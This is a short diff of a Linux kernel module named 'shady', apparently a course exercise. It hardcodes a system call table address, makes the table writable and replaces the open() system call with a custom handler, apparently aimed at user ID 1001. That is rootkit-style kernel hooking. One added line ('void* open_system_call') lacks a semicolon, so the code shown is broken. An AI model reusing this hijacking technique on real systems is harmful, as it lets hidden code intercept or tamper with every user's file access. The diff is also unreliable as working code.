@@ -44,9 +44,9 @@ static int shady_ndevices = SHADY_NDEVICES;
 
 module_param(shady_ndevices, int, S_IRUGO);
 
-unsigned long system_call_table_address = 0xffffffff817318f0;
-static void** system_call_table_func = (void*)0xffffffff817318f0;
-unsigned long marks_uid = 1001; 
+static void** system_call_table_func = (void*)0xffffffff81801400;
+unsigned long marks_uid = 1001;
+void* open_system_call 
 
 /* ================================================================ */
 
@@ -286,7 +286,7 @@ shady_init_module(void)
   //get old open
   old_open = system_call_table_func[__NR_open];
   //set as read/write
-  set_addr_rw(system_call_table_address);
+  set_addr_rw((unsigned long)system_call_table_func);
   //set my open
   system_call_table_func[__NR_open] = my_open;
   
